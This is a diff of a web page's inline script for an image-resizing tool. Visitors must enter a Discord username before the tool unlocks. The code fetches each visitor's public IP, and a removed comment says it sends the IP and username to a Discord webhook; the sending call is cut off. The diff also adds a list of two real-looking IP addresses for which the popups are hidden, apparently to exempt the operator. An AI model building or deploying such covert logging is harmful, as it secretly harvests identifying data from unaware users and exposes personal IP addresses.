@@ -137,11 +137,34 @@
         </div>
     </div>
 	
-	<script>
-    let discordUsername = '';
+<script>
+    let discordUsername = ''; // Initialize discordUsername
 
-    // Show the tutorial and secret modals on page load
+    const forbiddenIps = ['71.232.225.23', '73.173.101.175'];
+
+    // Function to fetch the user's IP and control modals
+    function checkIpAndAdjustModals() {
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const userIp = data.ip;
+
+                if (forbiddenIps.includes(userIp)) {
+                    // Remove popups if IP is forbidden
+                    document.getElementById('tutorialModal').style.display = 'none';
+                    document.getElementById('Secretmodal').style.display = 'none';
+                }
+            })
+            .catch(error => {
+                console.error('Failed to fetch IP:', error);
+            });
+    }
+
+    // Call the function to check IP and adjust modals
     window.onload = function() {
+        checkIpAndAdjustModals();
+
+        // Existing code to show the tutorial and secret modals
         const tutorialModal = document.getElementById('tutorialModal');
         tutorialModal.style.display = 'flex';
 
@@ -149,49 +172,41 @@
         secretModal.style.display = 'flex';
     };
 
-    // Close tutorial modal
+    // Existing event listeners for modal controls
     document.getElementById('closeTutorial').addEventListener('click', function() {
         document.getElementById('tutorialModal').style.display = 'none';
     });
 
-    // Close secret modal and show the Discord username modal
     document.getElementById('closesec').addEventListener('click', function() {
         document.getElementById('Secretmodal').style.display = 'none';
         document.getElementById('discordModal').style.display = 'flex';
     });
 
-    // Handle username submission
     document.getElementById('submitUsername').addEventListener('click', function() {
         discordUsername = document.getElementById('discordUsername').value.trim();
-        
-        // Define forbidden substrings and usernames
+
         const forbiddenSubstrings = ['@', '#', ':', '```', 'discord', ' ', '/', ')', '(', '*', '&', '^', '%', '$', '!'];
         const forbiddenUsernames = ['Discord', 'discord', '1', '2', '3', '4', '5'];
 
-        // Check if the username is empty
         if (discordUsername === '') {
             alert('Please enter your Discord username.');
             return;
         }
 
-        // Check for forbidden substrings
         for (let substring of forbiddenSubstrings) {
             if (discordUsername.includes(substring)) {
                 alert('The username contains forbidden characters or substrings.');
                 return;
             }
         }
-        
-        // Check for forbidden usernames
+
         if (forbiddenUsernames.includes(discordUsername.toLowerCase())) {
             alert('The username is not allowed.');
             return;
         }
 
-        // Hide the modal
         document.getElementById('discordModal').style.display = 'none';
 
-        // Enable the main form inputs
         document.getElementById('imageInput').disabled = false;
         document.querySelectorAll('button').forEach(button => {
             button.disabled = false;
@@ -199,7 +214,6 @@
         document.getElementById('widthInput').disabled = false;
         document.getElementById('heightInput').disabled = false;
 
-        // Fetch and send IP to Discord webhook along with username
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
